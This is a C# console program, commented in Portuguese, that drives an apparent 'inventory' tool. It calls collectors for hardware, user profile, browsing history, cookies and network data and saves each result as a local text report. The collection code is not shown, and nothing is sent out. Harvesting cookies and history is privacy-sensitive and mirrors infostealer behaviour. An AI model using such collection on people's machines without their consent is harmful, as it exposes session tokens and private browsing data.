using System;
using Teste.Infra;
using Teste.Modulos;

class Program
{
    static void Main()
    {
        Console.WriteLine(
            "Iniciando sistema de inventário..."
        );

        try
        {
            Relatorio relatorio =
                new Relatorio();


            // ==========================================
            // HARDWARE
            // ==========================================

            Hardware hardware =
                new Hardware();

            var dadosHardware =
                hardware.Coletar();

            relatorio.CriarArquivo(
                "01 - Hardware.txt",
                "01 - HARDWARE",
                dadosHardware
            );

            Console.WriteLine(
                "Hardware: OK"
            );


            // ==========================================
            // PERFIL
            // ==========================================

            Perfil perfil =
                new Perfil();

            var dadosPerfil =
                perfil.Coletar();

            relatorio.CriarArquivo(
                "04 - Perfil.txt",
                "04 - PERFIL",
                dadosPerfil
            );

            Console.WriteLine(
                "Perfil: OK"
            );


            // ==========================================
            // HISTÓRICO
            // ==========================================

            Historico historico =
                new Historico();

            var dadosHistorico =
                historico.Coletar();

            relatorio.CriarArquivo(
                "03 - Historico.txt",
                "03 - HISTÓRICO",
                dadosHistorico
            );

            Console.WriteLine(
                "Histórico: OK"
            );

            // ==========================================
            // COOKIES
            // ==========================================

            Cookies cookies =
             new Cookies();

            var dadosCookies =
                cookies.Coletar();

            relatorio.CriarArquivo(
                 "02 - Cookies.txt",
                 "02 - COOKIES",
                    dadosCookies
                            );

                Console.WriteLine(
                    "Cookies: OK"
                );


            // ==========================================
            // REDE
            // ==========================================

            var dadosRede =
                Rede.Coletar();

            relatorio.CriarArquivo(
                "05 - Rede.txt",
                "05 - REDE",
                dadosRede
            );

            Console.WriteLine(
                "Rede: OK"
            );

            // ==========================================
            // FINAL
            // ==========================================

            Console.WriteLine();

            Console.WriteLine(
                "Relatórios criados em:"
            );

            Console.WriteLine(
                relatorio.ObterPasta()
            );
        }
        catch (Exception erro)
        {
            Console.WriteLine();

            Console.WriteLine(
                "Erro durante a coleta:"
            );

            Console.WriteLine(
                erro
            );
        }
    }
}